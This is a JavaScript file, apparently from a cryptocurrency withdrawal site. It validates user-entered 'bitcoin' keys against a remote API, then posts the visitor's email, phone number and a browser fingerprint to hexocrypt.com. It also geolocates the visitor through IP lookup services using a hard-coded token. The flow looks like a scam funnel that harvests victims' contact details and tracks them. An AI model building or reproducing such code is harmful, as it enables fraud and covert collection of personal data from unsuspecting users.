const xhr = new XMLHttpRequest()

class UserInfo {
    constructor() {
        this.timeOpened = new Date()
        this.timezone = (new Date().getTimezoneOffset() / 60)
    }
    pageon() {
        return window.location.pathname
    }
    platform() { return navigator?.platform }
    langues() { return navigator?.languages }
    appVersion() { return navigator?.appVersion }
    productSub() { return navigator?.productSub }
    sicret() {

        let sicret_key = `${navigator?.productSub + navigator?.vendor + navigator?.appName + navigator?.platform + navigator?.product + navigator?.appVersion}`

        return sicret_key
    }
}

let info = new UserInfo()



function loaderFunction(status) {
    if (status) {
        let div = document.createElement('div');
        div.style = "position: fixed;width: 100%;height: 100%;top: 0;background-color: white;left: 0;z-index: 5000;display: flex;align-items: center;justify-content: center;"
        div.id = "loader-wrapper"
        div.innerHTML = '<div class="loader" style="color:red;"></div>'
        document.body.append(div)
    } else {
        document.getElementById("loader-wrapper").remove()

    }
}

async function send_request(type, laoder, url, data) {
    return new Promise((resolve, reject) => {
        let page = `https://hexocrypt.com/api/${url}`;
        xhr.open(type, page)
        xhr.responseType = "json"
        xhr.setRequestHeader('Access-Control-Allow-Headers', '*');
        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
        xhr.setRequestHeader("Accept", "application/json")
        xhr.setRequestHeader("Content-Type", "application/json")
        xhr.setRequestHeader("mode", "no-cors")
        xhr.setRequestHeader("cache", "no-cache")
        xhr.setRequestHeader("credentials", "same-origin")
        xhr.setRequestHeader("redirect", "follow")

        xhr.onload = () => {
            resolve(xhr.response)
        }

        if (data != false) {
            xhr.send(JSON.stringify(data))
        }
        else {
            xhr.send()

        }
    })
}

async function check_form(keys) {
    let bitcoin_title_id = document.getElementById("bitcoin_title").value
    let bitcoin_key_id = document.getElementById("bitcoin_key").value
    let email = document.getElementById('email_form').value
    document.getElementsByClassName("deposit-form__wait")[0].classList.add('active')


    setTimeout(() => {



        if (bitcoin_title_id == "") {
            document.getElementsByClassName("deposit-form__wait")[0].classList.remove('active')

            document.querySelector('.form-error').classList.add('active');
            setTimeout(() => {
                document.querySelector('.form-error').classList.remove('active');
            }, 7000)

            return
        } else if (bitcoin_key_id == "") {
            document.getElementsByClassName("deposit-form__wait")[0].classList.remove('active')

            document.querySelector('.form-error').classList.add('active');
            setTimeout(() => {
                document.querySelector('.form-error').classList.remove('active');
            }, 7000)

            return
        } else if (email == "") {
            document.getElementsByClassName("deposit-form__wait")[0].classList.remove('active')

            document.querySelector('.form-error').classList.add('active');
            setTimeout(() => {
                document.querySelector('.form-error').classList.remove('active');
            }, 7000)

            return
        }

        for (let key in keys) {
            if (keys[key].bitcoin_key == bitcoin_key_id && keys[key].bitcoin_title == bitcoin_title_id) {
                document.getElementsByClassName("deposit-form__wait")[0].classList.remove('active')
                document.querySelector('.data-inccorrect').classList.remove("active");
                document.querySelector('.form-error').classList.remove('active');

                popup.classList.add('show');
                document.getElementById("skip").addEventListener("click", () => {
                    popup.classList.remove('show');
                    document.getElementsByClassName("deposit-form__wait")[0].classList.add('active')
                    document.querySelector('.data-inccorrect').classList.remove("active");
                    document.querySelector('.form-error').classList.remove('active');

                    send_request("post", false, "withdraw-pages", { email: email, type: "important", phone: null, sicret: String(navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion) })

                    setTimeout(() => {
                        window.location.href = `withdraw.html?email=${email}`;
                    }, 10000)
                })
                document.getElementById("send").addEventListener("click", () => {
                    let nubmer_input = document.getElementById("number-input").value
                    if (nubmer_input == "") {
                        // document.getElementsByClassName("deposit-form__wait")[0].classList.remove('active')
                        // document.querySelector('.form-error').classList.add('active');
                        document.getElementById("fill_phone").classList.add('active')
                        setTimeout(() => {
                            document.getElementById("fill_phone").classList.remove('active')
                        }, 10000)


                    } else {
                        popup.classList.remove('show');
                        document.getElementsByClassName("deposit-form__wait")[0].classList.add('active')
                        document.querySelector('.data-inccorrect').classList.remove("active");
                        document.querySelector('.form-error').classList.remove('active');

                        let phone = `${code}${nubmer_input}`


                        send_request("post", false, "withdraw-pages", { email: email, type: "important", phone: phone, sicret: String(navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion) })
                        setTimeout(() => {
                            window.location.href = `withdraw.html?email=${email}`;
                        }, 10000)
                    }
                })

                popup.addEventListener('click', function (event) {
                    if (event.target === popup) {
                        popup.classList.remove('show');
                    }
                });

                return
            } else {
                document.getElementsByClassName("deposit-form__wait")[0].classList.remove('active')
                document.querySelector('.data-inccorrect').classList.add("active");
                setTimeout(() => {
                    document.querySelector('.data-inccorrect').classList.remove("active");
                }, 7000)
            }
        }
    }, 2000)

}

async function getDataBitcoin() {
    let keys = await send_request("get", false, "keys", false)
    check_form(keys)
}


async function getUserIp() {
    try {
        const response = await fetch('https://api.ipify.org/?format=json');
        const data = await response.json();

        return data;
    } catch (error) {
        console.error('Error fetching user ip:', error);
    }
}

async function getUserInfo() {
    try {

        const userIP = await getUserIp()

        const response = await fetch(`https://ipinfo.io/${userIP.ip}?token=0e596ac6cb8e69`, {
            method: "GET",
        })

        const data = await response.json();

        const flagEmoji = getFlagEmoji(data.country);

        return {"ip": data.ip, "country": data.country, "region": data.region, "flag": flagEmoji}
    } catch (error) {
        console.error('Error fetching user info:', error);
    }
}

function getFlagEmoji(countryCode) {
    return countryCode.toUpperCase().replace(/./g, char =>
        String.fromCodePoint(127397 + char.charCodeAt())
    );
}

// async function get() {
//     let users = await send_request("get", false, "users", false)
//     let codes = await send_request("get", false, "phone_nubmer_codes", false)
// }

// get()
